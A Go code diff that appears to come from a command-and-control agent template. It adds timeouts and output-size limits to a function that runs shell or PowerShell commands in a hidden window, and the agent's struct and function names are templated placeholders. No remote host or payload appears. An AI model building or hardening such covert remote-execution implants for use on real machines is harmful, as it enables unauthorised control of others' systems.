@@ -456,17 +456,31 @@ func executeCommandHidden(command string) (string, error) {
 	defer syscall.CloseHandle(syscall.Handle(pi.Process))
 	defer syscall.CloseHandle(syscall.Handle(pi.Thread))
 
-	// Wait for the process to complete
-	_, err = syscall.WaitForSingleObject(syscall.Handle(pi.Process), syscall.INFINITE)
-	if err != nil {
-		// Continue even if there was an error, we still want to read output
+	// Wait for the process to complete with a timeout to prevent hanging
+	result, err := syscall.WaitForSingleObject(syscall.Handle(pi.Process), 30000) // 30 second timeout
+	if err != nil || result == syscall.WAIT_TIMEOUT {
+		// If timeout occurs, try to terminate the process gracefully
+		syscall.TerminateProcess(syscall.Handle(pi.Process), 255)
+		return fmt.Sprintf("[ERROR] Command execution timed out after 30 seconds"), nil
 	}
 
-	// Read from stdout pipe - the child process wrote to stdoutWrite, so we read from stdoutRead
+	// Initialize buffers to read output
 	var stdoutBytes []byte
+	var stderrBytes []byte
 	var buffer [4096]byte
 	var bytesRead uint32
+
+	// Read from stdout pipe with a size limit to prevent excessive memory usage
+	const maxSize = 1024 * 1024 // 1MB limit - adjust as needed
+	totalRead := 0
+
 	for {
+		// Check if we've reached the size limit
+		if totalRead >= maxSize {
+			stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+			break
+		}
+
 		ret, _, _ := procReadFile.Call(
 			stdoutRead,
 			uintptr(unsafe.Pointer(&buffer[0])),
@@ -474,15 +488,36 @@ func executeCommandHidden(command string) (string, error) {
 			uintptr(unsafe.Pointer(&bytesRead)),
 			0,
 		)
-		if ret == 0 || bytesRead == 0 { // No more data or error
+
+		// Only continue if we successfully read data and haven't exceeded size
+		if ret == 0 || bytesRead == 0 {
 			break
 		}
+
+		// Check if adding this chunk would exceed our size limit
+		if totalRead + int(bytesRead) > maxSize {
+			// Only add what fits within our limit
+			remaining := maxSize - totalRead
+			stdoutBytes = append(stdoutBytes, buffer[:remaining]...)
+			stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+			break
+		}
+
 		stdoutBytes = append(stdoutBytes, buffer[:bytesRead]...)
+		totalRead += int(bytesRead)
 	}
 
-	// Read from stderr pipe - the child process wrote to stderrWrite, so we read from stderrRead
-	var stderrBytes []byte
+	// Reset counter for stderr
+	totalRead = 0
+
+	// Read from stderr pipe with a size limit
 	for {
+		// Check if we've reached the size limit
+		if totalRead >= maxSize {
+			stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+			break
+		}
+
 		ret, _, _ := procReadFile.Call(
 			stderrRead,
 			uintptr(unsafe.Pointer(&buffer[0])),
@@ -490,10 +525,23 @@ func executeCommandHidden(command string) (string, error) {
 			uintptr(unsafe.Pointer(&bytesRead)),
 			0,
 		)
-		if ret == 0 || bytesRead == 0 { // No more data or error
+
+		// Only continue if we successfully read data and haven't exceeded size
+		if ret == 0 || bytesRead == 0 {
 			break
 		}
+
+		// Check if adding this chunk would exceed our size limit
+		if totalRead + int(bytesRead) > maxSize {
+			// Only add what fits within our limit
+			remaining := maxSize - totalRead
+			stderrBytes = append(stderrBytes, buffer[:remaining]...)
+			stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+			break
+		}
+
 		stderrBytes = append(stderrBytes, buffer[:bytesRead]...)
+		totalRead += int(bytesRead)
 	}
 
 	// Close the read handles
@@ -1036,7 +1084,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 		}
 		return result
 	} else {
-		// For non-Windows systems, use the standard execution
+		// For non-Windows systems, use the standard execution with timeout and size limits
 		var cmd *exec.Cmd
 
 		if isPowerShell {
@@ -1045,16 +1093,117 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 			cmd = exec.Command("sh", "-c", command)
 		}
 
-		var stdout, stderr bytes.Buffer
-		cmd.Stdout = &stdout
-		cmd.Stderr = &stderr
-
-		err := cmd.Run()
+		// Create pipes to read output with size limits
+		stdoutPipe, err := cmd.StdoutPipe()
 		if err != nil {
-			return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
+			return fmt.Sprintf("[ERROR] Failed to create stdout pipe: %v", err)
 		}
 
-		output := stdout.String() + stderr.String()
+		stderrPipe, err := cmd.StderrPipe()
+		if err != nil {
+			return fmt.Sprintf("[ERROR] Failed to create stderr pipe: %v", err)
+		}
+
+		// Start the command
+		if err := cmd.Start(); err != nil {
+			return fmt.Sprintf("[ERROR] Failed to start command: %v", err)
+		}
+
+		// Read stdout with size limit
+		stdoutChan := make(chan string)
+		go func() {
+			var stdoutBytes []byte
+			buffer := make([]byte, 4096)
+			totalRead := 0
+			const maxSize = 1024 * 1024 // 1MB limit - same as Windows version
+
+			for {
+				// Check if we've reached the size limit
+				if totalRead >= maxSize {
+					stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+					break
+				}
+
+				n, err := stdoutPipe.Read(buffer)
+				if n > 0 {
+					// Check if adding this chunk would exceed our size limit
+					if totalRead + n > maxSize {
+						// Only add what fits within our limit
+						remaining := maxSize - totalRead
+						stdoutBytes = append(stdoutBytes, buffer[:remaining]...)
+						stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+						break
+					}
+
+					stdoutBytes = append(stdoutBytes, buffer[:n]...)
+					totalRead += n
+				}
+				if err != nil {
+					break
+				}
+			}
+			stdoutChan <- string(stdoutBytes)
+		}()
+
+		// Read stderr with size limit
+		stderrChan := make(chan string)
+		go func() {
+			var stderrBytes []byte
+			buffer := make([]byte, 4096)
+			totalRead := 0
+			const maxSize = 1024 * 1024 // 1MB limit - same as Windows version
+
+			for {
+				// Check if we've reached the size limit
+				if totalRead >= maxSize {
+					stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+					break
+				}
+
+				n, err := stderrPipe.Read(buffer)
+				if n > 0 {
+					// Check if adding this chunk would exceed our size limit
+					if totalRead + n > maxSize {
+						// Only add what fits within our limit
+						remaining := maxSize - totalRead
+						stderrBytes = append(stderrBytes, buffer[:remaining]...)
+						stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
+						break
+					}
+
+					stderrBytes = append(stderrBytes, buffer[:n]...)
+					totalRead += n
+				}
+				if err != nil {
+					break
+				}
+			}
+			stderrChan <- string(stderrBytes)
+		}()
+
+		// Wait for command completion with timeout
+		done := make(chan error, 1)
+		go func() {
+			done <- cmd.Wait()
+		}()
+
+		select {
+		case <-time.After(30 * time.Second): // 30 second timeout
+			if cmd.Process != nil {
+				cmd.Process.Kill()
+			}
+			return "[ERROR] Command execution timed out after 30 seconds"
+		case err := <-done:
+			if err != nil {
+				return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
+			}
+		}
+
+		// Get the output from both channels
+		stdoutResult := <-stdoutChan
+		stderrResult := <-stderrChan
+
+		output := stdoutResult + stderrResult
 		if output == "" {
 			return "[Command executed successfully - no output]"
 		}
